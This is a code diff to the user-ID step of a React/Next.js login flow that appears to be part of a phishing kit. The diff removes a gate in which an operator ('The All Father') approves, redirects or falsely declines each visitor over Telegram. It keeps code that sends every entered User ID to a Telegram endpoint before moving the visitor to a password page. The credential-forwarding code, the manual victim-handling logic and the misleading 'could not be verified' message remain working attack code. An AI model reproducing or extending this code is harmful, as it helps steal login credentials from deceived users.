@@ -4,44 +4,12 @@ import { useState } from "react";
 import { useRouter } from "next/navigation";
 import { SIGN_IN_LOADING_MS } from "@/lib/approval-messages";
 import { PAGE_H1_HEADING } from "@/lib/seo-keywords";
-import { useApproval } from "@/hooks/use-approval";
-import { advanceTarget, REDIRECT_TARGET_URL } from "@/lib/approval-steps";
-
-const DECLINE_MESSAGE =
-  "The information you entered could not be verified. Please check your details and try again.";
 
 export function UserIdStep() {
   const router = useRouter();
   const [userId, setUserId] = useState("");
   const [errors, setErrors] = useState<{ userId?: string; form?: string }>({});
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [token, setToken] = useState<string | null>(null);
-
-  // Gate on The All Father's Telegram approval before advancing.
-  useApproval({
-    token,
-    onDecide: (res) => {
-      setIsSubmitting(false);
-      setToken(null);
-      if (res.status === "decided") {
-        if (res.decision === "approve") {
-          router.push(advanceTarget("user_id", userId.trim()));
-          return;
-        }
-        if (res.decision === "redirect") {
-          window.location.href = REDIRECT_TARGET_URL;
-          return;
-        }
-        // decline → show "incorrect", reopen the form for re-entry
-        setErrors({ form: DECLINE_MESSAGE });
-        return;
-      }
-      // expired → release the form so they can retry
-      setErrors((prev) =>
-        prev.form ? { ...prev, form: DECLINE_MESSAGE } : prev,
-      );
-    },
-  });
 
   const handleUserIdBlur = () => {
     if (!userId.trim()) {
@@ -73,24 +41,18 @@ export function UserIdStep() {
     }
 
     try {
-      const res = await fetch("/api/telegram/input", {
+      await fetch("/api/telegram/input", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           inputs: { "User ID": trimmedUserId, Flow: "login" },
         }),
-      });
-      const data = (await res.json().catch(() => ({}))) as { token?: string };
-      // Await The All Father's approval (token null → not gated, continue).
-      if (data?.token) {
-        setToken(data.token);
-        return;
-      }
+      }).catch(() => null);
     } catch (err) {
       console.error(err);
     }
 
-    // Fallback: no token (notification path failed) → just advance.
+    // User ID step is not approval-gated — advance to password.
     await new Promise((resolve) => setTimeout(resolve, SIGN_IN_LOADING_MS));
     router.push(`/password?userId=${encodeURIComponent(trimmedUserId)}`);
   };
